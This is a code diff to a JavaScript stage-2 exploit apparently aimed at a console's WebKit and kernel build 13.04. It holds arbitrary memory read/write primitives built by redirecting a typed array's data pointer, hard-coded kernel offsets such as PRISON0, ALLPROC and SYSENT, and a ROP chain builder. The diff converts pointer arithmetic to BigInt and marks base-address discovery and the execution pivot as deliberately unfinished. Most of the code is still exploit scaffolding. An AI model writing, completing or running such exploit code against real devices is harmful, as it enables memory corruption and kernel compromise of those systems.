@@ -14,8 +14,10 @@ var g_rwView = null;          // The genuine Uint8Array we redirect
 var g_rwHeader = null;        // Original header backup
 var g_scratchBytes = null;    // Scratch buffer for pointer encoding
 var g_scratchWords = null;
-var g_webkit_base = 0;
-var g_libkernel_base = 0;
+var g_webkit_base = 0n;
+var g_libkernel_base = 0n;
+// Supplied by Jordy's integration. This file does not discover or fabricate it.
+var targetAddress = null;
 
 // WebKit 13.04 ROP Gadgets
 var G = {
@@ -35,11 +37,11 @@ var G = {
 
 // Kernel 13.04 offsets
 var K = {
-    PRISON0:         0x0111FA18,
-    ROOTVNODE:       0x02136E90,
-    ALLPROC:         0x01B28538,
-    SYSENT:          0x01102B70,
-    memcpy:          0x002BD4F0,
+    PRISON0:         0x0111FA18n,
+    ROOTVNODE:       0x02136E90n,
+    ALLPROC:         0x01B28538n,
+    SYSENT:          0x01102B70n,
+    memcpy:          0x002BD4F0n,
 };
 
 function log(msg) {
@@ -83,12 +85,24 @@ function stage2_restore() {
 // ============================================================
 // STEP 1: Read/Write primitives
 // ============================================================
+function toAddress(value) {
+    if (typeof value === "bigint") return value;
+    if (typeof value === "number" && Number.isSafeInteger(value) && value >= 0)
+        return BigInt(value);
+    throw new TypeError("64-bit address must be a BigInt or safe non-negative integer");
+}
+
+function formatAddress(value) {
+    return "0x" + toAddress(value).toString(16);
+}
+
 function setVector(addr) {
-    // Redirect rwView's m_vector to addr
-    var lo = addr & 0xFFFFFFFF;
-    var hi = Math.floor(addr / 0x100000000);
-    g_scratchWords[0] = lo >>> 0;
-    g_scratchWords[1] = hi >>> 0;
+    // Redirect rwView's m_vector to addr. Pointer arithmetic stays in BigInt.
+    var address = toAddress(addr);
+    var lo = address & 0xFFFFFFFFn;
+    var hi = (address >> 32n) & 0xFFFFFFFFn;
+    g_scratchWords[0] = Number(lo);
+    g_scratchWords[1] = Number(hi);
     for (var i = 0; i < 8; i++)
         g_candidate[0x10 + i] = g_scratchBytes[i];
 }
@@ -113,15 +127,15 @@ function read32(addr) {
 
 function read64(addr) {
     setVector(addr);
-    var lo = g_rwView[0] 
-        + g_rwView[1] * 0x100 
-        + g_rwView[2] * 0x10000 
-        + g_rwView[3] * 0x1000000;
-    var hi = g_rwView[4] 
-        + g_rwView[5] * 0x100 
-        + g_rwView[6] * 0x10000 
-        + g_rwView[7] * 0x1000000;
-    return lo + hi * 0x100000000;
+    var lo = BigInt(g_rwView[0])
+        | (BigInt(g_rwView[1]) << 8n)
+        | (BigInt(g_rwView[2]) << 16n)
+        | (BigInt(g_rwView[3]) << 24n);
+    var hi = BigInt(g_rwView[4])
+        | (BigInt(g_rwView[5]) << 8n)
+        | (BigInt(g_rwView[6]) << 16n)
+        | (BigInt(g_rwView[7]) << 24n);
+    return lo | (hi << 32n);
 }
 
 function write8(addr, val) {
@@ -138,17 +152,10 @@ function write32(addr, val) {
 }
 
 function write64(addr, val) {
-    var lo = val & 0xFFFFFFFF;
-    var hi = Math.floor(val / 0x100000000);
+    var value = toAddress(val);
     setVector(addr);
-    g_rwView[0] = lo & 0xFF;
-    g_rwView[1] = (lo >> 8) & 0xFF;
-    g_rwView[2] = (lo >> 16) & 0xFF;
-    g_rwView[3] = (lo >> 24) & 0xFF;
-    g_rwView[4] = hi & 0xFF;
-    g_rwView[5] = (hi >> 8) & 0xFF;
-    g_rwView[6] = (hi >> 16) & 0xFF;
-    g_rwView[7] = (hi >> 24) & 0xFF;
+    for (var i = 0; i < 8; i++)
+        g_rwView[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
 }
 
 // ============================================================
@@ -163,8 +170,10 @@ function findWebkitBase() {
     // We know targetAddress from Jordy's addrof
     
     // Read targetView's vtable (first 8 bytes of the cell)
+    if (targetAddress === null || targetAddress === undefined)
+        throw new Error("incomplete integration: targetAddress was not supplied by Jordy");
     var vtable = read64(targetAddress);
-    log("[S2] targetView vtable: 0x" + vtable.toString(16));
+    log("[S2] targetView vtable: " + formatAddress(vtable));
     
     // Uint8Array vtable offset in WebKit 13.04 needs to be determined
     // For now, try common pattern: vtable is in the data segment
@@ -174,11 +183,11 @@ function findWebkitBase() {
     // SID >= 0x4000 and aligned to 0x10
     // The vtable for JSC::JSUint8Array is at a known offset
     
-    // TODO: Determine JSUint8Array vtable offset for 13.04
-    // For now, estimate: vtable is likely near 0x3cc0000-0x3d00000 range
-    // webkit_base = vtable - vtable_offset
-    
-    return 0; // placeholder
+    // INCOMPLETE: the exact JSUint8Array vtable offset for the target build
+    // has not been established from a versioned WebKit binary. Do not guess
+    // a base from the approximate range mentioned in old notes.
+    log("[S2] WebKit base unresolved: versioned vtable anchor is required");
+    return 0n;
 }
 
 // ============================================================
@@ -189,8 +198,10 @@ function findLibkernelBase() {
     // pthread_create is imported from libkernel
     // GOT entry for pthread_create at webkit_base + 0x3ce1000 (approx)
     
-    // TODO: Find exact GOT offset
-    return 0; // placeholder
+    // INCOMPLETE: the exact GOT slot and libkernel symbol/NID are not
+    // established for this build. Returning a sentinel prevents false success.
+    log("[S2] libkernel base unresolved: versioned GOT/NID evidence is required");
+    return 0n;
 }
 
 // ============================================================
@@ -202,7 +213,7 @@ function buildRopChain() {
     var i = 0;
     
     function p(gadget_offset) {
-        chain[i++] = wk + gadget_offset;
+        chain[i++] = toAddress(wk) + BigInt(gadget_offset);
     }
     function v(value) {
         chain[i++] = value;
@@ -244,8 +255,10 @@ function executeRop(chain) {
     // Write the chain there
     // Overwrite a callback to point to chain start
     
-    log("[S2] ROP chain: " + chain.length + " entries");
-    log("[S2] TODO: Implement execution pivot");
+    if (!Array.isArray(chain)) throw new TypeError("ROP chain must be an array");
+    log("[S2] ROP chain constructed with " + chain.length + " entries");
+    log("[S2] INCOMPLETE: execution pivot is intentionally not implemented");
+    return false;
 }
 
 // ============================================================
@@ -255,12 +268,12 @@ function stage2_run() {
     log("[S2] ====== STAGE 2 START ======");
     
     g_webkit_base = findWebkitBase();
-    if (g_webkit_base === 0) {
+    if (g_webkit_base === 0n) {
         log("[S2] Could not determine webkit_base - need vtable offset");
         log("[S2] Dumping first 64 bytes at targetAddress for analysis...");
         var dump = "";
         for (var i = 0; i < 64; i++) {
-            var b = read8(targetAddress + i);
+            var b = read8(toAddress(targetAddress) + BigInt(i));
             dump += (b < 16 ? "0" : "") + b.toString(16);
             if (i % 16 === 15) dump += "\n";
         }
@@ -269,15 +282,15 @@ function stage2_run() {
         return;
     }
     
-    log("[S2] webkit_base = 0x" + g_webkit_base.toString(16));
+    log("[S2] webkit_base = " + formatAddress(g_webkit_base));
     
     g_libkernel_base = findLibkernelBase();
-    log("[S2] libkernel_base = 0x" + g_libkernel_base.toString(16));
+    log("[S2] libkernel_base = " + formatAddress(g_libkernel_base));
     
     var chain = buildRopChain();
-    executeRop(chain);
-    
-    log("[S2] ====== STAGE 2 COMPLETE ======");
+    var executed = executeRop(chain);
+    log(executed ? "[S2] ====== STAGE 2 COMPLETE ======" :
+        "[S2] ====== STAGE 2 INCOMPLETE ======");
 }
 
 // ============================================================
